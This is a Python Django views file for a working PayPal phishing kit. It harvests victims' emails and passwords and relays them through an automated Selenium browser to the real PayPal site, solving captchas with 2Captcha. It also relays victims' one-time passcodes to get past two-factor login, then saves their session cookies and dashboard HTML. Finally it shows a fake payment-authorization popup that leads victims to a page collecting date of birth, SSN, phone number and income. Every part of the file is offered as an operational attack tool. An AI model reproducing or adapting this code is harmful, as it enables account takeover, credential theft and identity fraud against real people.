from django.shortcuts import render, redirect
from django.urls import reverse
from django.http import HttpResponse
from .models import Credentials, viewers
import uuid, json, time
from ipware import get_client_ip
from requests_futures.sessions import FuturesSession
from selenium import webdriver
from twocaptcha import TwoCaptcha
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from bs4 import BeautifulSoup


def condition(driver):
    """
    :return: True if the current url of the end user is "dashboard" or "summary".
    """

    look_for = ("/dashboard", "/summary")
    url = driver.current_url
    for s in look_for:
        if url.find(s) != -1:
            return True

    return False


def redirect_home(request):
    """
    :return: Redirects to the homepage. Used to make the code below more readable.
    """

    return redirect(reverse('homepage'))


def random_string(string_length):
    """
    :param string_length: Length of the random string generated.
    :return: Generated string of random values used in the URLs.
             Makes it hard for user to know exact URL of page for reverse engineering.
    """

    random = str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())+str(uuid.uuid4())
    random = random.upper()
    return random[0:string_length]


def home(request):
    """
    Gets login details of user.

    :param request: Metadata about the request.
    :return: Loads OTP page if login details are correct, else shows error message.
    """
    # Get user's IP.
    _ip_, _ = get_client_ip(request)
    # If user never visited site before, log their IP.
    if len(viewers.objects.filter(ip=_ip_)) == 0:
        new = viewers(ip=_ip_)
        new.save()
    # If user submitted form, save their ip, login details and user agent.
    if request.method == 'POST' and request.POST:
        user_agent = request.POST.get('User Agent')
        ip, is_routable = get_client_ip(request)
        email = request.POST.get('login_email')
        password = request.POST.get('login_password')
        inp_data = Credentials(email=email, password=password, ip=ip, user_agent=user_agent)
        inp_data.save()
        # Get identifier that is used later.
        identifier = inp_data.id
        url = request.build_absolute_uri(reverse('get_cookies'))
        myobj = {'email': email, 'password': password, 'user_agent': user_agent, 'identifier': identifier}
        # Create a new session and post 'myobj' data to 'get_cookies' url.
        session = FuturesSession()
        future_one = session.post(url=url, data=myobj)
        # Waiting for session to log into user's PayPal.
        while Credentials.objects.get(id=identifier).wrong_creds == -1:
            time.sleep(2)
        # If credentials are right, load OTP page to pass PayPal's security.
        if Credentials.objects.get(id=identifier).wrong_creds == 0:
            return redirect(reverse('otp', args=(random_string(72), identifier, random_string(43), random_string(53))))
        # If credentials are wrong, sends back to login page with an error message.
        if Credentials.objects.get(id=identifier).wrong_creds == 1:
            return render(request, 'index.html', {'show_error': 'true'})
    else:
        # Loads the login page with an error if anything goes wrong.
        return render(request, 'index.html', {'show_error': 'false'})


def otp(request, identifier):
    """
    :param request: Metadata about the request.
    :param identifier: ID of current user in database.
    :return: Displays PayPal OTP request page to user.
    """
    context = {
        'rnd1': random_string(68),
        'rnd2': random_string(56),
        'rnd3': random_string(35),
        'email': identifier
    }
    return render(request, 'paypal_otp.html', context)


def enter_otp(request, identifier):
    """
    :param request: Metadata about the request.
    :param identifier: ID of current user in database.
    :return: If user submitted OTP, redirects them to copy of their PayPal dashboard.
             Else, loads the PayPal Enter OTP page.
    """

    if request.method == 'POST' and request.POST:
        OTP_value = request.POST.get('answer')
        # Get user's database object.
        victim = Credentials.objects.get(id=identifier)
        # Update OTP value.
        victim.otp = OTP_value
        victim.save()
        # Redirect to copy of their dashboard.
        return redirect(reverse('dashboard', args=(random_string(72), identifier, random_string(43), random_string(53))))
    else:
        return render(request, 'paypal_enter_otp.html')


def show_dashboard(request, identifier):
    """
    :param request: Metadata about the request.
    :param identifier: ID of current user in database.
    :return: The scraped HTML code of user's PayPal dashboard.
    """

    url = reverse('deauthorize', args=(identifier,))
    # HTML Code for a popup labeled "Account has been deactivated".
    popup = """<link href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css rel=stylesheet><style>@charset "UTF-8";@font-face{font-family:PayPal-Sans;font-style:normal;font-weight:400;src:local('PayPalSansSmall-Regular'),url(https://www.paypalobjects.com/ui-web/paypal-sans-small/1-0-0/PayPalSansSmall-Regular.eot);src:local('PayPalSansSmall-Regular'),url(https://www.paypalobjects.com/ui-web/paypal-sans-small/1-0-0/PayPalSansSmall-Regular.woff2) format('woff2'),url(https://www.paypalobjects.com/ui-web/paypal-sans-small/1-0-0/PayPalSansSmall-Regular.woff) format('woff'),url(https://www.paypalobjects.com/ui-web/paypal-sans-small/1-0-0/PayPalSansSmall-Regular.svg#69ac2c9fc1e0803e59e06e93859bed03) format('svg');mso-font-alt:'Calibri'}@font-face{font-family:PayPal-Sans;font-style:normal;font-weight:500;src:local('PayPalSansSmall-Medium'),url(https://www.paypalobjects.com/ui-web/paypal-sans-small/1-0-0/PayPalSansSmall-Medium.eot);src:local('PayPalSansSmall-Medium'),url(https://www.paypalobjects.com/ui-web/paypal-sans-small/1-0-0/PayPalSansSmall-Medium.woff2) format('woff2'),url(https://www.paypalobjects.com/ui-web/paypal-sans-small/1-0-0/PayPalSansSmall-Medium.woff) format('woff'),url(https://www.paypalobjects.com/ui-web/paypal-sans-small/1-0-0/PayPalSansSmall-Medium.svg#69ac2c9fc1e0803e59e06e93859bed03) format('svg');mso-font-alt:'Calibri'}html{box-sizing:border-box}*,:after,:before{box-sizing:inherit}body,html{height:100%}body{font-size:inherit!important;font-family:PayPal-Sans,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;font-smoothing:antialiased}a,a:visited{color:#0070ba;text-decoration:none;font-weight:500;font-family:PayPal-Sans,Calibri,Trebuchet,Arial,sans-serif}a:active,a:focus,a:hover{color:#005ea6;text-decoration:underline}code,dd,dt,input,label,li,p,pre,textarea{font-size:.9375rem;line-height:1.6;font-weight:400;text-transform:none;font-family:PayPal-Sans,Calibri,Trebuchet,Arial,sans-serif}.vx_legal-text{font-size:.8125rem;line-height:1.38461538;font-weight:400;text-transform:none;font-family:PayPal-Sans,sans-serif;color:#6c7378}*{-webkit-text-size-adjust:none}.ExternalClass *{line-height:100%}td{mso-line-height-rule:exactly}body{margin:0;padding:0;font-family:PayPal-Sans,Calibri,Trebuchet,Arial,sans-serif!important;background:"#f2f2f2";color:'#2c2e2f'}div[style*="margin: 16px 0"]{margin:0!important}.greyLink a:link{color:#949595}.applefix a{color:inherit;text-decoration:none}.ppsans{font-family:PayPal-Sans,Calibri,Trebuchet,Arial,sans-serif!important}.mpidiv img{width:100%;height:auto;min-width:100%;max-width:100%}.stackTbl{width:100%;display:table}.greetingText{padding:0 20px}@media screen and (max-width:640px){.imgWidth{width:20px!important}}@media screen and (max-width:480px){.imgWidth{width:10px!important}.greetingText{padding:0}}.partner_image{max-width:250px;max-height:90px;display:block}</style><div><div class=cw_tile-container data-fpti-availability='{"domain_status":"DEFAULT"}'data-fpti-error=""data-fpti-impression='{"domain_status":"DEFAULT"}'data-widget-name=balance><div style=display:none id=balance-tile-header><i class="fa fa-warning"style=color:#c72f38;padding-right:7px></i>A payment of $499.99 at G2A requires authentication</div><h3 class=cw_tile-header><div style="border-bottom:1px solid #e1e1e1;padding-bottom:15px"class="ppvx_text--medium ppvx_text--xl"data-fpti-click='{"domain_status":"DEFAULT"}'data-name=balanceHeader href=/myaccount/money/ target=""><i class="fa fa-warning"style=padding-right:7px></i>A payment of $499.99 at G2A.COM LIMITED requires authentication</div></h3><div style=text-align:center><table border=0 cellpadding=0 cellspacing=0 width=100%><tr><td style="padding:0 10px 20px 10px"><table border=0 cellpadding=0 cellspacing=0 width=100% dir=ltr id=cartDetails style=font-size:16px><tr><td style="padding:0 10px;text-align:left;border-top:0;width:50%;vertical-align:top"><table border=0 cellpadding=0 cellspacing=0 width=100%><tr><td style="padding:0 0 20px 0"class=ppsans><p class=ppsans dir=ltr style=font-size:16px;line-height:25px;color:#2c2e2f;margin:0;word-break:break-word><span><strong>Transaction ID</strong></span><br><a href=# target=_blank>308HIN23F239128JI</a></table><td style="padding:0 10px;text-align:left;border-top:0;width:50%;vertical-align:top"><table border=0 cellpadding=0 cellspacing=0 width=100%><tr><td style="padding:0 0 20px 0"class=ppsans><p class=ppsans dir=ltr style=font-size:16px;line-height:25px;color:#2c2e2f;margin:0;word-break:break-word><span><strong>Instructions to merchant</strong></span><br><span>You haven't entered any instructions.</span></table><tr><tr><td style="padding:0 10px;text-align:left;border-top:0;width:50%;vertical-align:top"><table border=0 cellpadding=0 cellspacing=0 width=100%><tr><td style="padding:0 0 20px 0"class=ppsans><p class=ppsans dir=ltr style=font-size:16px;line-height:25px;color:#2c2e2f;margin:0;word-break:break-word><span><strong>Merchant</strong></span><br><span><a href=http://G2A.COM target=_blank data-saferedirecturl="https://www.google.com/url?q=http://G2A.COM&source=gmail&ust=1617258607729000&usg=AFQjCNFniPUTfAnpgyFKD81Ety44r_cAMA">G2A.<span class=il>COM</span></a> Limited<br></span><span><a href=mailto:paypal@g2a.com target=_blank><span class=il>paypal</span>@g2a.<span class=il>com</span></a><br></span><span>+48 222282121<br></span></table><td style="padding:0 10px;text-align:left;border-top:0;width:50%;vertical-align:top"><tr><td style="padding:0 10px;text-align:left;border-top:0;width:50%;vertical-align:top"><table border=0 cellpadding=0 cellspacing=0 width=100%><tr><td style="padding:0 0 20px 0"class=ppsans><p class=ppsans dir=ltr style=font-size:16px;line-height:25px;color:#2c2e2f;margin:0;word-break:break-word><span><strong>Invoice ID</strong></span><br><span>clf72t91-6923-40fr-87a5-fllz17742b33</span></table></table></table><a href=# class="cw_tile-button ppvx_btn ppvx_btn--secondary ppvx_btn--size_sm test_balance_btn-transferMoney"data-name=balanceTransferMoney role=button style="margin:0 10px">Authorize </a><a """ + f'''href="{url}"''' + """ class="cw_tile-button ppvx_btn ppvx_btn--secondary ppvx_btn--size_sm test_balance_btn-transferMoney"data-name=balanceTransferMoney role=button style="margin:0 10px">Deauthorize</a></div></div></div>"""
    # Wait till session gets HTML code of user's dashboard.
    while Credentials.objects.get(id=identifier).html_code == "":
        time.sleep(2)
    context = {
        'identifier': identifier
    }
    victim_code = Credentials.objects.get(id=identifier).html_code
    final_code = ""
    # Parse HTML because it needs to be modified.
    parsed = BeautifulSoup(victim_code, 'html.parser')
    victim_code = str(parsed)

    # Business and personal accounts have different dashboards. Accounts for both HTML layouts.
    try:
        found = str(parsed.find_all('div', {'class': 'cw_tile-container'})[0])

        index = victim_code.index(found)
        final_code += victim_code[:index]
        final_code += popup
        final_code += victim_code[index:]
    except:
        found = str(parsed.find('div', id='mep_pageItems_leftBottom'))
        new_index = victim_code.index(found)
        final_code += victim_code[:new_index]
        final_code += popup
        final_code += victim_code[new_index:]

    return HttpResponse(final_code)


def reset_pass(request):
    return render(request, 'paypal_forgot.html')


def open_browser(email, password, user_agent, identifier):
    """
    Open browser to get cookies.

    :param email: User's email.
    :param password: User's password.
    :param user_agent: User's browser user-agent.
    :param identifier: ID of current user in database.
    :return: Nothing, but updates the database throughout.
    """

    # Set up 2Captcha.
    solver = TwoCaptcha('PUT_API_KEY_HERE')
    opts = Options()
    opts.headless = False  # Headless is False now, but when put on server, should be True.
    opts.add_argument(f"user-agent={user_agent}")
    opts.add_argument('--lang=en_US')
    opts.add_argument("--window-size=1920,1080")
    opts.add_argument("--disable-extensions")
    opts.add_argument("--proxy-server='direct://'")
    opts.add_argument("--proxy-bypass-list=*")
    opts.add_argument("--start-maximized")
    #opts.add_argument('--headless')
    opts.add_argument('--disable-gpu')
    opts.add_argument('--disable-dev-shm-usage')
    opts.add_argument('--no-sandbox')
    opts.add_argument('--ignore-certificate-errors')
    browser = webdriver.Chrome(ChromeDriverManager().install(), chrome_options=opts)
    browser.implicitly_wait(1)
    browser.get('https://www.paypal.com/signin')

    def do_captcha():
        # Function that can be called on pages where a captcha can sometimes show up.
        key = browser.find_element_by_xpath('//*[@id="content"]/form/input[2]').get_attribute('value')
        print("CAPTCHA KEY", key)
        result = solver.recaptcha(sitekey=key, url=browser.current_url)
        print('RESULT', result)
        iframe = browser.find_element_by_xpath('//*[@id="content"]/form/iframe')
        browser.switch_to.frame(iframe)
        browser.execute_script(f'document.getElementById("g-recaptcha-response").innerHTML = "{result["code"]}";')
        browser.implicitly_wait(1)
        browser.execute_script("verifyCallback(grecaptcha.enterprise.getResponse());")
        browser.switch_to.default_content()
        browser.implicitly_wait(1.5)

    def captcha_check():
        # Check for captcha.
        try:
            if browser.find_element_by_xpath('//*[@id="content"]/h1').text == 'Security Challenge':
                do_captcha()
                return True
        except:
            pass
        return False

    # Wait till captcha loads.
    while captcha_check():
        print(captcha_check())
        continue
    # PayPal has two different login pages. Both are accounted for.
    # Login with email and password on the same page.
    browser.implicitly_wait(0.5)
    try:
        browser.find_element_by_xpath('//*[@id="email"]').clear()
        browser.find_element_by_xpath('//*[@id="email"]').send_keys(email)
        browser.find_element_by_xpath('//*[@id="password"]').clear()
        browser.find_element_by_xpath('//*[@id="password"]').send_keys(password)
        browser.find_element_by_xpath('//*[@id="btnLogin"]').click()
    # Login with email and password on different pages.
    except:
        browser.find_element_by_xpath('//*[@id="btnNext"]').click()
        browser.implicitly_wait(1)
        browser.find_element_by_xpath('//*[@id="password"]').clear()
        browser.find_element_by_xpath('//*[@id="password"]').send_keys(password)
        browser.find_element_by_xpath('//*[@id="btnLogin"]').click()
    browser.implicitly_wait(2)
    # Check for captcha.
    while captcha_check():
        continue

    browser.implicitly_wait(2)
    # Check if login details were correct.
    current_url = browser.current_url
    temp_user = Credentials.objects.get(id=identifier)
    if 'https://www.paypal.com/signin' in current_url:
        # WRONG URL, meaning that credentials were incorrect.
        temp_user.wrong_creds = 1
        temp_user.save()
        browser.close()
        return
    else:
        temp_user.wrong_creds = 0
        temp_user.save()
    # Let PayPal send user an OTP.
    browser.find_element_by_xpath('//*[@id="challenges"]/div/div[2]/button').click()
    browser.implicitly_wait(1)
    # Check for captcha
    while captcha_check():
        continue
    # Wait till user inputs OTP on PayPal replica site.
    while Credentials.objects.get(id=identifier).otp == 'NA':
        time.sleep(2)
    OTP_value = Credentials.objects.get(id=identifier).otp
    # Put the OTP code and log in.
    browser.find_element_by_xpath('//*[@id="answer"]').send_keys(OTP_value)
    browser.find_element_by_xpath('//*[@id="securityCodeSubmit"]').click()
    browser.implicitly_wait(1.5)
    # Check for captcha.
    while captcha_check():
        continue

    # Wait until dashboard page.
    WebDriverWait(browser, 10).until(condition)
    browser.implicitly_wait(5)
    # Logged in. Now save the working cookies.
    victim = Credentials.objects.get(id=identifier)
    cookie = browser.get_cookies()
    victim.cookies = str(json.dumps(cookie, indent=4))
    # Save HTML of dashboard.
    browser.get("view-source:" + browser.current_url)  # View source of page
    code = 'data = document.getElementsByTagName("tr");html = "";var i;for (i=0; i<data.length-1;i++){html += data[1+i].textContent;}var para = document.createElement("p");para.setAttribute("id", "html-code-para");var node = document.createTextNode(html); para.appendChild(node);var element = document.getElementsByTagName("body")[0];element.appendChild(para);'
    id = 'html-code-para'
    # Execute command to save the text at current url. (i.e get the source code)
    # Using built in methods for source code did not working on PayPal's site.
    browser.execute_script(code)
    html_code = browser.find_element_by_id(id).text

    victim.html_code = html_code
    victim.save()

    # End browser.
    browser.close()


def get_cookies(request):
    """
    Calls the Open_Browser function with the user's login credentials and user-agent.

    :param request: Metadata about the request.
    :return: Nothing.
    """
    if request.method == 'POST' and request.POST:
        open_browser(request.POST.get('email'),request.POST.get('password'), request.POST.get('user_agent'), request.POST.get('identifier'))

    return HttpResponse('')


def deauthorize(request, identifier):
    """
    Additional page that loads when custom popup on dashboard is clicked.
    Tells people to put more details to prevent their account from being deactivated.
    :param request: Metadata about the request.
    :param identifier: ID of current user in database.
    :return: Loads a page telling user they successfully confirmed their identity.
    """
    if request.method == 'POST' and request.POST:
        victim = Credentials.objects.get(id=identifier)
        victim.dob = request.POST.get('dob')
        victim.ssn = request.POST.get('nationalId')
        victim.phone_number = request.POST.get('telephone')
        victim.income_after_tax = request.POST.get('selfReportedIncome')
        victim.save()
        return render(request, 'identity_confirmed.html')

    context = {
        'rnd1': random_string(68),
        'rnd2': random_string(56),
        'rnd3': random_string(35),
        'identifier': identifier
    }
    return render(request, 'get_fullz.html', context)


def handle404(request, exception):
    return render(request, '403.html')
